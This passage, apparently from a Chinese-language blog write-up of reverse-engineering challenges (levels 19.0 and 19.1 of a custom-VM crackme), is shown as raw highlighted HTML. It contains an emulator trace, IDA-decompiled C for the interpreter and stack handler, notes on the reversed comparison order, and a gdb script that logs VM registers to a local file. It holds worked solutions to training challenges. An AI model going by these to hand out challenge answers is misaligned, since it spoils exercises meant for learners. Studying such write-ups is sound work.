arg2:<span class="hljs-number">0</span>x4f<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x4f<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x4f s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xbb f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x4f s:<span class="hljs-number">0</span>x9 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xbc f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x52<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x52<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x52 s:<span class="hljs-number">0</span>x9 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xbd f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x52 s:<span class="hljs-number">0</span>xa <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xbe f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x52<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x52<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x52 s:<span class="hljs-number">0</span>xa <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xbf f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x52 s:<span class="hljs-number">0</span>xb <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc0 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x45<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x45<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x45 s:<span class="hljs-number">0</span>xb <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc1 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x45 s:<span class="hljs-number">0</span>xc <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc2 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x43<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x43<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x43 s:<span class="hljs-number">0</span>xc <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc3 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x43 s:<span class="hljs-number">0</span>xd <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc4 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x54<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x54<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x54 s:<span class="hljs-number">0</span>xd <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc5 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x54 s:<span class="hljs-number">0</span>xe <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc6 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x21<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x21<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x21 s:<span class="hljs-number">0</span>xe <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc7 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x21 s:<span class="hljs-number">0</span>xf <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc8 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xa<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xa<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xa s:<span class="hljs-number">0</span>xf <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xc9 f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>xa s:<span class="hljs-number">0</span>x10 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xca f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xb<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xb<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span>xb d:<span class="hljs-number">0</span>xa s:<span class="hljs-number">0</span>x10 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xcb f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span>xb d:<span class="hljs-number">0</span>xa s:<span class="hljs-number">0</span>x10 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xcc f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x1 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> SYS <span class="hljs-number">0</span>x8 d<br><span class="hljs-selector-attr">[s]</span> ... write<br>INCORRECT!<br><span class="hljs-selector-attr">[s]</span> ... return value (<span class="hljs-keyword">in</span> register d): <span class="hljs-number">0</span>xb<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span>xb d:<span class="hljs-number">0</span>xb s:<span class="hljs-number">0</span>x10 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xcd f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6 c:<span class="hljs-number">0</span>xb d:<span class="hljs-number">0</span>xb s:<span class="hljs-number">0</span>x10 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xce f:<span class="hljs-number">0</span>x6<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x1 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> SYS <span class="hljs-number">0</span>x20 NONE<br><span class="hljs-selector-attr">[s]</span> ... exit<br></code></pre></td></tr></table></figure><p>还挺复杂的…下面的是idapro的逆向源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">interpreter_loop</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int8 v1; <span class="hljs-comment">// al</span><br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v1 = *(_BYTE *)(a1 + <span class="hljs-number">1029</span>);<br>    *(_BYTE *)(a1 + <span class="hljs-number">1029</span>) = v1 + <span class="hljs-number">1</span>;<br>    interpret_instruction(<br>      a1,<br>      *(<span class="hljs-type">unsigned</span> __int16 *)(a1 + <span class="hljs-number">3LL</span> * v1) | ((<span class="hljs-type">unsigned</span> __int64)*(<span class="hljs-type">unsigned</span> __int8 *)(a1 + <span class="hljs-number">3LL</span> * v1 + <span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-number">16</span>));<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">interpret_instruction</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> __int8 *a1, __int64 a2)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;[V] a:%#hhx b:%#hhx c:%#hhx d:%#hhx s:%#hhx i:%#hhx f:%#hhx\n&quot;</span>,<br>    a1[<span class="hljs-number">1024</span>],<br>    a1[<span class="hljs-number">1025</span>],<br>    a1[<span class="hljs-number">1026</span>],<br>    a1[<span class="hljs-number">1027</span>],<br>    a1[<span class="hljs-number">1028</span>],<br>    a1[<span class="hljs-number">1029</span>],<br>    a1[<span class="hljs-number">1030</span>]);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[I] op:%#hhx arg1:%#hhx arg2:%#hhx\n&quot;</span>, BYTE2(a2), (<span class="hljs-type">unsigned</span> __int8)a2, BYTE1(a2));<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x200000</span>) != <span class="hljs-number">0</span> )<br>    interpret_imm(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x100000</span>) != <span class="hljs-number">0</span> )<br>    interpret_add(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x40000</span>) != <span class="hljs-number">0</span> )<br>    interpret_stk(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x80000</span>) != <span class="hljs-number">0</span> )<br>    interpret_stm(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x20000</span>) != <span class="hljs-number">0</span> )<br>    interpret_ldm(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x800000</span>) != <span class="hljs-number">0</span> )<br>    interpret_cmp(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x400000</span>) != <span class="hljs-number">0</span> )<br>    interpret_jmp(a1, a2);<br>  result = BYTE2(a2) &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x10000</span>) != <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> interpret_sys(a1, a2);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>看一下新操作<code>STK</code>所做的操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">interpret_stk</span><span class="hljs-params">(__int64 a1, __int16 a2)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v4; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int8 v5; <span class="hljs-comment">// al</span><br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v7; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int8 memory; <span class="hljs-comment">// al</span><br><br>  v2 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)describe_register(HIBYTE(a2));<br>  v3 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)describe_register((<span class="hljs-type">unsigned</span> __int8)a2);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[s] STK %s %s\n&quot;</span>, v3, v2);<br>  <span class="hljs-keyword">if</span> ( HIBYTE(a2) )<br>  &#123;<br>    v4 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)describe_register(HIBYTE(a2));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[s] ... pushing %s\n&quot;</span>, v4);<br>    ++*(_BYTE *)(a1 + <span class="hljs-number">1028</span>);<br>    v5 = read_register(a1, HIBYTE(a2));<br>    write_memory(a1, *(<span class="hljs-type">unsigned</span> __int8 *)(a1 + <span class="hljs-number">1028</span>), v5);<br>  &#125;<br>  result = (<span class="hljs-type">unsigned</span> __int8)a2;<br>  <span class="hljs-keyword">if</span> ( (_BYTE)a2 )<br>  &#123;<br>    v7 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)describe_register((<span class="hljs-type">unsigned</span> __int8)a2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[s] ... popping %s\n&quot;</span>, v7);<br>    memory = read_memory(a1, *(<span class="hljs-type">unsigned</span> __int8 *)(a1 + <span class="hljs-number">1028</span>));<br>    write_register(a1, (<span class="hljs-type">unsigned</span> __int8)a2, memory);<br>    result = a1;<br>    --*(_BYTE *)(a1 + <span class="hljs-number">1028</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出，这是模拟栈，并且把栈地址设置为<code>a1[1028]</code></p><p>最后做出来，感觉不太需要关心这个栈，其实只需要看CMP指令，然后发现它第一个比较的数是<code>a1[0x3b]</code>和<code>a1[0xa9]</code>，第二个比较的数是<code>a1[3a]</code>和<code>a1[a8]</code>。一个逆序比较，那么不用管，只需要调整一下顺序就可以了。把前俩放到最后就行了。</p><h4 id="level19-1"><a href="#level19-1" class="headerlink" title="level19.1"></a>level19.1</h4><p>我们通过gdb脚本，然后拿到对应的opcode以及arg1和arg2。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros">b <span class="hljs-number">*0</span>x589192137cd1<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$fd</span> = fopen(<span class="hljs-string">&quot;/home/hacker/Desktop/rsi.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br><br><span class="hljs-keyword">while</span> 1<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rsi_value</span> = <span class="hljs-variable">$rsi</span><br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$a</span> = *(unsigned char*)(<span class="hljs-variable">$rax</span> + 0x400)<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$b</span> = *(unsigned char*)(<span class="hljs-variable">$rax</span> + 0x401)<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$c</span> = *(unsigned char*)(<span class="hljs-variable">$rax</span> + 0x402)<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$d</span> = *(unsigned char*)(<span class="hljs-variable">$rax</span> + 0x403)<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$s</span> = *(unsigned char*)(<span class="hljs-variable">$rax</span> + 0x404)<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$i</span> = *(unsigned char*)(<span class="hljs-variable">$rax</span> + 0x405)<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$f</span> = *(unsigned char*)(<span class="hljs-variable">$rax</span> + 0x406)<br>    call fprintf(<span class="hljs-variable">$fd</span>,<span class="hljs-string">&quot;a:%x b:%x c:%x d:%x s:%x i:%x f:%x\n&quot;</span>, <span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>,<span class="hljs-variable">$c</span>,<span class="hljs-variable">$d</span>,<span class="hljs-variable">$s</span>,<span class="hljs-variable">$i</span>,<span class="hljs-variable">$f</span>)<br>    call fprintf(<span class="hljs-variable">$fd</span>, <span class="hljs-string">&quot;0x%lx\n&quot;</span>, <span class="hljs-variable">$rsi_value</span>)<br><br>    continue<br>end<br><br>call fclose(<span class="hljs-variable">$fd</span>)<br>quit<br></code></pre></td></tr></table></figure><p>这个break的地址是通过gdb调试过程中拿到的，其实就是死循环中调用的那个函数的call指令的地址。然后，<code>$rax</code>在这时存储的是a1的首地址，然后我们发现偏移地址就是+0x403，这可以通过调试或者19.0这个level拿到。然后，就打印出来<code>a,b,c,d,s,i,f</code>变量的值。以此来判断，我们要发送的字符串，以及其做的代码混淆处理。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span 